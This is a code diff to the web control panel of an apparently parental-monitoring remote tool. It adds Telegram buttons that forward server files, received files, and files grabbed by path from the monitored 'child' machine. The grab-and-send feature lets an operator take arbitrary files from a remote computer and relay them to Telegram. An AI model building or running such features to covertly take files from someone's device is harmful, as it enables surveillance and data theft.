@@ -653,6 +653,9 @@ body {
             </div>
         </div>
 
+        <!-- ═══════════════════════════════════════════════════════════ -->
+        <!-- ✅ v1.2.7.1: TELEGRAM PANEL — with new file-send buttons  -->
+        <!-- ═══════════════════════════════════════════════════════════ -->
         <div class="control-panel">
             <h6>
                 <i class="fab fa-telegram"></i> Telegram
@@ -679,6 +682,8 @@ body {
                         <span style="color:#f85149;font-weight:600;">🔴 Offline</span>
                     </label>
                 </div>
+
+                <!-- ── Screenshot / Apps ─────────────────────────── -->
                 <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-top:6px;">
                     <button class="btn-ctrl" onclick="tgSendLatestScreenshot()" title="Send latest screenshot">
                         <i class="fas fa-image"></i> Latest 📸
@@ -687,6 +692,41 @@ body {
                         <i class="fas fa-th"></i> Apps
                     </button>
                 </div>
+
+                <!-- ✅ NEW: FILE SEND SECTION (v1.2.7.1) -->
+                <div style="margin-top:10px;padding-top:10px;border-top:1px solid var(--border);">
+                    <div style="font-size:10px;font-weight:700;color:var(--text-secondary);letter-spacing:.5px;text-transform:uppercase;margin-bottom:6px;">
+                        <i class="fas fa-paperclip"></i> Send Files
+                    </div>
+
+                    <!-- Row 1: Admin uploads -->
+                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:6px;">
+                        <button class="btn-ctrl" onclick="tgListAdminFiles()" title="List & send admin-uploaded files">
+                            <i class="fas fa-hdd"></i> Server Files
+                        </button>
+                        <button class="btn-ctrl" onclick="tgPickAndSendAdminFile()" title="Pick one file by name from server's files folder">
+                            <i class="fas fa-hand-pointer"></i> Pick File
+                        </button>
+                    </div>
+
+                    <!-- Row 2: Received files -->
+                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:6px;">
+                        <button class="btn-ctrl" onclick="tgSendAllReceivedToTelegram()" title="Send every received file to Telegram">
+                            <i class="fas fa-inbox"></i> Received
+                        </button>
+                        <button class="btn-ctrl" onclick="tgPickAndSendReceivedFile()" title="Pick one received file by name">
+                            <i class="fas fa-hand-pointer"></i> Pick Recv
+                        </button>
+                    </div>
+
+                    <!-- Row 3: Grab from child + send -->
+                    <button class="btn-ctrl success" style="width:100%;font-size:10px;"
+                            onclick="tgGrabAndSendFromChild()"
+                            title="Grab a file from the child's machine and send it to Telegram">
+                        <i class="fas fa-download"></i> Grab &amp; Send from Child
+                    </button>
+                </div>
+
                 <button class="btn-ctrl" style="font-size:10px;margin-top:6px;" onclick="tgSendCustomText()">
                     <i class="fas fa-comment"></i> Send Custom Message
                 </button>
@@ -2197,7 +2237,7 @@ function rcShowShortcuts() {
 }
 
 // ============================================================
-// TELEGRAM
+// TELEGRAM  — v1.2.7.1 (with file-send helpers)
 // ============================================================
 async function tgLoad() {
     try {
@@ -2299,6 +2339,140 @@ async function tgSendCustomText() {
     const r = await api('/api/telegram/send-text', 'POST', { text });
     if (r && r.success) { rcLog('✅ Message sent', 'success'); toast('Message sent', 'success'); }
     else { rcLog('❌ Send failed', 'error'); toast('Send failed', 'error'); }
+}
+
+// ────────────────────────────────────────────────────────────
+// ✅ NEW v1.2.7.1: Telegram FILE sending helpers
+// ────────────────────────────────────────────────────────────
+
+/**
+ * Fetch the server's list of admin-uploaded files and let the user pick one
+ * to send to Telegram. Uses /api/files/list?source=admin to filter.
+ */
+async function tgListAdminFiles() {
+    rcLog('📋 Fetching server files…', 'info');
+    const list = await api('/api/files/list?limit=200');
+    if (!Array.isArray(list) || list.length === 0) {
+        rcLog('⚠️ No files on server', 'warn');
+        toast('No files on server', 'warn');
+        return;
+    }
+    // Filter to admin files only (source === 'admin')
+    const adminFiles = list.filter(f => f.source === 'admin' || !f.source);
+    if (adminFiles.length === 0) {
+        rcLog('⚠️ No admin-uploaded files found', 'warn');
+        toast('No admin-uploaded files', 'warn');
+        return;
+    }
+    const names = adminFiles.map((f, i) => `${i+1}. ${f.name} (${f.size_formatted || ''})`).join('\n');
+    const choice = prompt(
+        `Server files (${adminFiles.length}):\n\n${names}\n\nEnter # to send:`,
+        '1'
+    );
+    if (!choice) return;
+    const idx = parseInt(choice) - 1;
+    if (isNaN(idx) || idx < 0 || idx >= adminFiles.length) {
+        toast('Invalid selection', 'warn');
+        return;
+    }
+    const chosen = adminFiles[idx];
+    await tgSendServerFile(chosen.name);
+}
+
+/**
+ * Direct prompt for filename → send from server's files/ folder.
+ */
+async function tgPickAndSendAdminFile() {
+    const name = prompt(
+        'Filename to send from server\'s FILES_DIR:\n' +
+        '(e.g. report.pdf — must already exist on the server)'
+    );
+    if (!name) return;
+    await tgSendServerFile(name.trim());
+}
+
+async function tgSendServerFile(filename) {
+    rcLog(`📤 Sending ${filename} → Telegram…`, 'info');
+    const url = `/api/telegram/send-file/${encodeURIComponent(filename)}?source=files`
+              + (currentDeviceId ? `&deviceId=${encodeURIComponent(currentDeviceId)}` : '');
+    const r = await api(url, 'POST');
+    if (r && r.success) {
+        rcLog(`✅ ${filename} sent to Telegram`, 'success');
+        toast(`${filename} sent to Telegram`, 'success');
+    } else {
+        rcLog('❌ Send failed: ' + ((r && r.error) || 'unknown'), 'error');
+        toast('Send failed: ' + ((r && r.error) || 'unknown'), 'error');
+    }
+}
+
+/**
+ * Prompt for a filename already in the received-files list → send to Telegram.
+ */
+async function tgPickAndSendReceivedFile() {
+    if (!currentDeviceId) { toast('Select a device first', 'warn'); return; }
+    await rcLoadReceivedFiles(true);
+    if (!receivedFiles.length) {
+        toast('No received files yet', 'warn');
+        return;
+    }
+    const names = receivedFiles.map((f, i) =>
+        `${i+1}. ${f.filename} (${formatBytes(f.size)})`).join('\n');
+    const choice = prompt(
+        `Received files (${receivedFiles.length}):\n\n${names}\n\nEnter # to send:`,
+        '1'
+    );
+    if (!choice) return;
+    const idx = parseInt(choice) - 1;
+    if (isNaN(idx) || idx < 0 || idx >= receivedFiles.length) {
+        toast('Invalid selection', 'warn');
+        return;
+    }
+    const f = receivedFiles[idx];
+    await rcTelegramReceived(f.dev_folder, f.filename);
+}
+
+/**
+ * Grab a file from the child and immediately send it to Telegram.
+ * Two-step: fetch_file command → wait → send-file with source=received.
+ */
+async function tgGrabAndSendFromChild() {
+    if (!currentDeviceId) { toast('Select a device first', 'warn'); return; }
+    const path = prompt(
+        "Absolute path on the child's machine to grab & send:\n" +
+        "Example: C:\\Users\\Kid\\Desktop\\homework.pdf"
+    );
+    if (!path) return;
+    const base = path.split('\\').pop() || path.split('/').pop();
+
+    rcLog(`📥 Grabbing ${path} from child…`, 'info');
+    toast('Grabbing file from child…', 'info');
+
+    // Step 1: request the file
+    const r = await rcSendAndTrack('/api/control/fetch-file', { path },
+        `Fetch ${base}`, { attempts: 40 });
+
+    if (!r || !r.ok) {
+        rcLog('❌ Fetch failed — cannot send to Telegram', 'error');
+        return;
+    }
+    rcLog('✅ File uploaded to server', 'success');
+
+    // Step 2: refresh received list to find the actual stored filename
+    // (server may suffix a timestamp on collision)
+    await rcLoadReceivedFiles(true);
+    const match = receivedFiles.find(f =>
+        f.filename === base || f.filename.startsWith(base.replace(/\.[^.]+$/, ''))
+    ) || receivedFiles[0];
+
+    if (!match) {
+        rcLog('⚠️ Fetched file not found in received list', 'warn');
+        toast('File fetched but not indexed yet — try "Received" button', 'warn');
+        return;
+    }
+
+    // Step 3: send to Telegram
+    rcLog(`📤 Sending ${match.filename} → Telegram…`, 'info');
+    await rcTelegramReceived(match.dev_folder, match.filename);
 }
 
 // ============================================================
@@ -2409,7 +2583,7 @@ function rcBootAfterAuth() {
         if (e.key === 'Escape') { e.preventDefault(); rcHotkey('esc'); }
     });
 
-    rcLog('✅ UI v1.2.7 ready. Select a device to begin.', 'success');
+    rcLog('✅ UI v1.2.7.1 ready. Select a device to begin.', 'success');
 }
 </script>
 </body>
